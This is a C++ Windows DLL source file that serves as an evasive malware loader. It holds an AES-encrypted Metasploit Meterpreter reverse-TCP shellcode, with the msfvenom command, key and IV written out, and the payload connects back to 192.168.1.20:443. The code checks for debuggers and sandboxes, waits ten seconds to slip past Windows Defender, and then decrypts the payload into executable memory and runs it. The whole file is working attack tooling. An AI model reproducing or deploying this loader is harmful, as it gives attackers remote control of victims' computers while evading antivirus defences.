// dllmain.cpp : Définit le point d'entrée de l'application DLL.
#define CBC 1
#include "aes.h"
#include <Windows.h>
#include <Wininet.h>
#include <stdbool.h> 
#include <stdio.h>
#include <string.h> 
#include <stdlib.h> 
#include <iostream>

#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Wininet.lib")

using namespace std;

// Actual length of the payload
#define PAYLOADLENGTH 650
#define IV "E7a0eCX76F0YzS4j"
#define KEY "6ASMkFslyhwXehNZw048cF1Vh1ACzyyR"
#define CLASSNAME "myWindowClass"
#define WINDOWTITLE "My Title"

// RC4 payload is used to maximize stealth during network communication. 
// ruby ./msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 EXIT_FUNC=PROCESS LHOST=192.168.1.20 LPORT=443 SessionRetryTotal=60 RC4PASSWORD=GeekIsChic --encrypt aes256 --encrypt-iv E7a0eCX76F0YzS4j --encrypt-key 6ASMkFslyhwXehNZw048cF1Vh1ACzyyR -f c -o /tmp/meterpreter.c
// No encoder or badchars specified, outputting raw payload
// Payload size: 650 bytes
// Final size of c file: 2780 bytes
unsigned char buf[] =
"\xf7\x31\x73\x5b\x3f\x3c\xc4\x90\x00\x8c\xaa\x14\xac\x21\x71"
"\x26\x16\x3d\x34\xed\x04\xac\xa8\xbe\x25\xdb\x69\x00\x07\x4f"
"\xf1\xeb\x28\x20\x01\xfe\xc8\xc8\x72\xa2\xb9\xee\x06\x95\x34"
"\x1a\x93\x57\x81\x5c\xb3\xbc\x83\xe3\x28\x8c\x32\x31\xf3\x33"
"\xb1\xdc\x59\x16\x4e\xb3\xe8\x8d\x5a\x33\x5f\xdd\xe1\x90\xaf"
"\xf0\xef\x1a\x71\x6d\xe5\x55\x4f\x1c\x80\xf4\x76\xb1\x39\x4b"
"\x0c\x6f\x2c\xc3\x86\xd4\x6a\x9f\x2a\x66\x54\xc3\x5e\x2f\x3a"
"\x9e\x95\x9f\x3b\xd7\x80\xa6\xbe\x8f\xdd\xd0\x3d\x53\x53\x36"
"\x5e\x10\xf1\x51\x6e\xb9\x6b\x9c\xd6\xfd\x2e\x9f\xd3\xa2\xfc"
"\xbe\xad\xd8\xed\x8e\xe2\x0e\xbe\x95\x8f\x93\xec\x44\x89\xa9"
"\x6c\xe7\xd1\x03\x83\x58\x18\xcf\xf6\x44\x8d\xa3\x46\xaa\x13"
"\xb5\xc2\xae\x2a\x5a\x73\xb4\xa5\x79\xdc\x9e\x2b\x26\x65\xd0"
"\x90\x20\xda\x2d\xab\x74\xf4\xa4\xe4\x1c\x79\xf8\xe0\x08\xc8"
"\xac\x86\x49\xf9\x9e\xb0\x84\xce\xcf\x92\xed\x80\x36\x02\xb8"
"\x9b\x8e\x38\x98\x25\xe7\x37\x4b\x7a\x92\xce\xa0\xd1\x16\x18"
"\x3e\x7e\xa2\x2d\xce\x44\xf9\xec\xc9\x06\x9e\x83\x8d\x7c\x54"
"\xb6\x66\x65\xf7\x19\xfb\x39\xe1\x5c\xb0\x22\x3e\x15\xbd\x7e"
"\x65\x8f\x77\xf1\x2a\x7b\xa4\x4e\xb4\x60\xa5\x97\x49\x74\x8c"
"\xf7\x3c\x2d\xbb\xaf\xf1\x23\x9f\x2e\x70\x34\xe6\x4b\xd5\x79"
"\x5a\xed\x02\xa8\x10\x4a\x63\xe1\x01\x90\xfc\xda\x9d\xb3\x7a"
"\x36\xa5\x71\xfc\xac\xcd\x2b\xa1\x57\x68\x8a\x7e\xe6\x2e\xf1"
"\xb1\x31\x5b\x4e\xf5\x14\xbb\x81\x89\xc6\xc5\x13\xa1\x87\xa6"
"\xaa\xb0\x68\x7d\xfa\xd7\xfe\xa3\xe5\x4a\x4b\xc5\xa6\x08\xa8"
"\xa4\x4f\x6e\x66\x65\x25\xc6\x9d\x56\xc6\x92\x4d\xb2\xe6\x59"
"\xb5\x8c\xd1\x8e\x3d\x7e\x83\xe0\x96\x65\xac\x45\x1e\xf5\xcc"
"\xf7\xd1\xc6\xeb\x4e\xa4\x2f\x9c\x58\xf1\xab\xa8\x18\x83\xf7"
"\x3f\xf6\xf6\x17\x51\x5a\x64\x01\x85\x95\x68\x6a\x08\xae\x51"
"\x9b\xd7\x01\xe0\x6f\x0d\xa1\xde\xad\xf4\xd7\x52\x93\x2b\x47"
"\xcc\xe6\xf4\x79\x0d\xab\xa7\x4e\x36\x26\x5a\x96\xf9\x93\x5e"
"\x7c\xa2\x09\x99\x6a\x4f\x79\x49\x72\x57\x5e\x4c\x19\x4f\x17"
"\xa9\x32\xb2\x37\x02\xae\x6f\x73\x4b\x01\xf7\x60\xfc\xff\x25"
"\x50\x35\x44\x32\x42\xc8\xb0\x71\x9c\x8c\x4b\x4d\x14\xe6\xdb"
"\x26\x72\x25\x6c\xcf\x2a\x6c\xe8\xf5\xce\x85\x33\x88\x3e\xf0"
"\x2e\x09\x05\x00\xc7\x67\x6a\x2e\x47\x78\x40\x87\x38\x9e\xc5"
"\x70\x3e\x07\x80\x89\x5b\x67\x71\x91\x12\x5e\x0c\xb8\x90\xf1"
"\x17\x33\x61\xd6\x0a\xb7\xa1\xe3\x0e\x44\xf3\x9e\x0c\xbc\x8c"
"\x2d\x58\x36\xb1\x20\xe6\x75\x49\x8a\xcb\x71\x34\x5d\x18\xcc"
"\x58\x8b\x36\x82\xce\xe3\x7b\x71\x14\xa9\xd6\xa6\x59\x26\xdd"
"\x0c\x11\x2d\x0c\x76\x8d\xc0\x44\x8e\xf1\xa2\x97\x27\x08\x4d"
"\xe8\xb7\x9c\x13\xdd\x3f\xb2\x6d\xfe\x37\xdf\x6f\xcc\xbb\x75"
"\x40\xf6\x81\xfc\xf3\x85\xa8\xad\x29\xb5\xcd\xcc\x92\xb6\x83"
"\x14\xb0\x64\x11\x5c\xb1\x9d\x19\x28\x2a\x3a\x78\xad\x4c\x97"
"\x46\xc5\x60\x43\xf0\x96\xbb\xf6\xf4\xf5\xfe\xd8\xd5\xdd\x2f"
"\xca\xf5\xa4\xaf\x5c\xe9\xbf\xc6\x1e\x09\x3f";


const int ENCRYPTEDBUFFERLENGTH = sizeof(buf);

namespace Aes256MsfPayload {
	class Utils {
	public:
		static char IsDbgPresent() {
			if (IsDebuggerPresent())
			{
				return 1;
			}
			return 0;
		}

		static bool IsSandboxPresent() {
			// Non-uniform memory access (NUMA) is a computer memory design used in multiprocessing, 
			// where the memory access time depends on the memory location relative to the processor.
			// https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf
			return VirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0) == NULL;
		}

		static DWORD WINAPI ExecuteCode(LPVOID lpPayload) {
			void(*func)();
			func = (void(*)()) lpPayload;
			(void)(*func)();
			return 0;
		}
	};

	class CryptoUtils {
	public:
		static void AES256Decrypt(uint8_t* uString, uint8_t* uIv, const char* uKey) {
			struct AES_ctx ctx;
			AES_init_ctx_iv(&ctx, uKey, uIv);
			AES_CBC_decrypt_buffer(&ctx, uString, PAYLOADLENGTH);

			// The last byte needs to a null-byte terminator to read correctly.
			memcpy((char*)uString + PAYLOADLENGTH, "\x00", 1);
		}
	};

	class Rc4ReverseTcp {
	public:
		void Start() {
			TCHAR s[256];

			LPVOID lpPayload = VirtualAlloc(NULL, ENCRYPTEDBUFFERLENGTH, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (lpPayload) {
				ZeroMemory(lpPayload, ENCRYPTEDBUFFERLENGTH);
				memcpy(lpPayload, buf, ENCRYPTEDBUFFERLENGTH);
			}
			else {
				return;
			}

			// uint8_t : 8 unsigned bits
			uint8_t* uPayload = (uint8_t*)lpPayload;
			uint8_t* uIv = (uint8_t*)IV;
			//uint8_t* uKey = (uint8_t*)KEY;

			CryptoUtils::AES256Decrypt(uPayload, uIv, KEY);

			// Also useful to bypass Sandboxing
			// AFAIK it's working for Windows Defender
			Sleep(10000);
			Utils::ExecuteCode(uPayload);
		}
	};
}

extern "C" __declspec(dllexport) void Exec() {
	if (!Aes256MsfPayload::Utils::IsDbgPresent() && !Aes256MsfPayload::Utils::IsSandboxPresent()) {
		Aes256MsfPayload::Rc4ReverseTcp* p = new Aes256MsfPayload::Rc4ReverseTcp();
		try {
			p->Start();
			delete(p);
		}
		catch (const std::exception &e) {
		}
	}
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

